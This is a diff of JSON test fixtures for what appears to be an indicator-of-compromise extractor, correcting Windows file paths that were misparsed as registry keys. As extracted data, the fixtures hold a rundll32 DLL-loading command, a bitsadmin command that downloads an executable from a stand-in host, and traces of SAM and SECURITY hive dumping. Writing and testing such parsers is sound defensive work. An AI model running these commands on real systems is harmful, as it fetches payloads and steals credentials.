@@ -165,12 +165,12 @@
             "value": "rundll32.exe C:\\Users\\Public\\gopher.dll,#1"
           }
         ],
-        "registry_key": [
+        "file_path": [
           {
-            "canonical": "HKEY_USERS\\Public\\gopher.dll",
+            "canonical": "C:\\Users\\Public\\gopher.dll",
             "defanged": false,
             "line": 3,
-            "value": "\\Users\\Public\\gopher.dll"
+            "value": "C:\\Users\\Public\\gopher.dll"
           }
         ],
         "url": [
@@ -186,7 +186,7 @@
       "n_artifacts": 4,
       "summary": {
         "command": 2,
-        "registry_key": 1,
+        "file_path": 1,
         "url": 1
       },
       "vendor": "securelist"
@@ -274,25 +274,13 @@
             "defanged": false,
             "line": 4,
             "value": "HKLM\\SECURITY C"
-          },
-          {
-            "canonical": "HKEY_USERS\\Public\\sam.hive",
-            "defanged": false,
-            "line": 3,
-            "value": "\\Users\\Public\\sam.hive"
-          },
-          {
-            "canonical": "HKEY_USERS\\Public\\sec.hive",
-            "defanged": false,
-            "line": 4,
-            "value": "\\Users\\Public\\sec.hive"
           }
         ]
       },
       "fixture_id": "mandiant.002",
-      "n_artifacts": 4,
+      "n_artifacts": 2,
       "summary": {
-        "registry_key": 4
+        "registry_key": 2
       },
       "vendor": "mandiant"
     },
@@ -421,18 +409,18 @@
             "value": "bitsadmin /transfer j http://drop/x.exe C:\\Users\\Public\\x.exe"
           }
         ],
-        "registry_key": [
+        "file_path": [
           {
-            "canonical": "HKEY_USERS\\Public\\x.exe",
+            "canonical": "C:\\Users\\Public\\x.exe",
             "defanged": false,
             "line": 3,
-            "value": "\\Users\\Public\\x.exe"
+            "value": "C:\\Users\\Public\\x.exe"
           },
           {
-            "canonical": "HKEY_USERS\\Public\\x.exe",
+            "canonical": "C:\\Users\\Public\\x.exe",
             "defanged": false,
             "line": 4,
-            "value": "\\Users\\Public\\x.exe"
+            "value": "C:\\Users\\Public\\x.exe"
           }
         ],
         "url": [
@@ -448,7 +436,7 @@
       "n_artifacts": 4,
       "summary": {
         "command": 1,
-        "registry_key": 2,
+        "file_path": 2,
         "url": 1
       },
       "vendor": "huntress"
